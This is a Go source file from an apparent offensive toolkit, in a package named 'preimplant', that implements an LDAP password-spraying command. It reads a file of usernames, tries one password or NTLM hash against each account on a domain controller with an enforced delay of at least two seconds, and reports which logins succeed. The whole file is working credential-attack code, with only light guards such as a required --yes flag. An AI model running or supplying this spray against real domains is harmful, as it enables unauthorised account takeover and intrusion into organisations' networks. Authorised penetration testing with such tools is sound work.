package preimplant

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/KKingZero/ARK/pkg/ldapcli"
)

func ldapSpray(args []string) error {
	f, _ := ParseFlags(args)
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing ldap spray without --yes")
	}
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	userFile := first(f, "user-file", "users")
	if userFile == "" {
		return fmt.Errorf("usage: ark ldap spray --dc H --domain D --user-file users.txt --pass-file P --delay 2s --yes")
	}
	if opts.Password == "" && opts.Hash == "" {
		return fmt.Errorf("--pass-file required")
	}
	delay, err := parseSprayDelay(first(f, "delay"))
	if err != nil {
		return err
	}
	users, err := readLineFile(userFile)
	if err != nil {
		return err
	}
	if len(users) == 0 {
		return fmt.Errorf("user-file empty")
	}
	printProxyHint()
	pass := opts.Password
	hash := opts.Hash
	for i, u := range users {
		if i > 0 {
			time.Sleep(delay)
		}
		one := opts
		one.Username = u
		one.Password = pass
		one.Hash = hash
		conn, err := ldapcli.Bind(one)
		if err != nil {
			fmt.Printf("%s result=%s\n", u, ldapcli.ClassifyBindError(err))
			continue
		}
		conn.Close()
		fmt.Printf("%s result=success\n", u)
	}
	return nil
}

func parseSprayDelay(raw string) (time.Duration, error) {
	if strings.TrimSpace(raw) == "" {
		return 2 * time.Second, nil
	}
	d, err := time.ParseDuration(raw)
	if err != nil {
		return 0, fmt.Errorf("--delay: %w", err)
	}
	if d < 2*time.Second {
		return 0, fmt.Errorf("--delay must be >= 2s (got %s)", d)
	}
	return d, nil
}

func readLineFile(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		s := strings.TrimSpace(sc.Text())
		if s == "" || strings.HasPrefix(s, "#") {
			continue
		}
		out = append(out, s)
	}
	return out, sc.Err()
}
